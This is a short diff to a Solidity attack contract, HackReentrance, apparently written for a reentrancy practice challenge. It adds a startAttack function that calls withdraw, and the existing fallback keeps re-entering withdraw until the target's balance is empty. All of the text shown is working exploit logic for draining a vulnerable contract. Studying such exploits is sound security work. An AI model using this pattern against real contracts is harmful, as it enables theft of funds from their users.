@@ -18,6 +18,10 @@ contract HackReentrance {
     reentranceAddress.donate.value(amountToWithdraw)(address(this));
   }
 
+  function startAttack() {
+    reentranceAddress.withdraw(amountToWithdraw);
+  }
+
   fallback() external payable {
     if(address(reentranceAddress).balance != 0){
       reentranceAddress.withdraw(amountToWithdraw);
